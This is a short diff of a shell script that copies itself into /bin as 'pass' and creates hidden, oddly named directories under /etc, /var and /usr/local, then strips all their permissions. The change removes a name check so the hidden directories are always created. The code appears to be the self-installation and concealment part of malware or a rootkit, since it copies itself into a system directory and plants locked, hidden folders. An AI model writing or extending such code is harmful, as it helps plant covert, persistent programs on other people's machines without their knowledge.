@@ -21,7 +21,7 @@ if [ ! -e /bin/pass ]; then
     chmod u+rx "$0"
     cp "$0" /bin
 fi
-if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
+if [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
     mkdir /var/.Hj /usr/local/.ko /etc/.raulm /etc/.raulm/.Ye
     chmod a-rwx /etc/.raulm  /var/.Hj  /usr/local/.ko
 fi
